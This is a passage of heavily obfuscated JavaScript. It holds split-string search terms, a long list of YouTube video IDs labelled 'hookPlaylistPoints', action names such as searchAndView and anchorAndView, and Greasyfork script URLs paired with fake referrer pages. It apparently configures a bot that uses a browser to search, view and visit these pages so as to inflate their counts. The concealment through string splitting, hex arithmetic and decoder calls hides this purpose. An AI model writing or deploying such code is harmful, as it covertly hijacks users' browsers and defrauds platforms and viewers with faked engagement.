'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x7 * 0x493 + -0x2240 + 0x23 * 0x1e5)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x54 * 0x59 + -0xedd * 0x1 + 0xe4d * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0x2345 + 0x542 + -0x1 * -0x1e06);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    Y(0x9, 'm[o]') + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    Y(0x1, '9V(l') + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + Z(0x19),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + Z(0x13)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x7) + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x12)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + Y(0xe, 'Jm7(') + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + Z(0x6) + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + Y(0x11, 'J267') + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + Y(0xd, 'tRPs'),
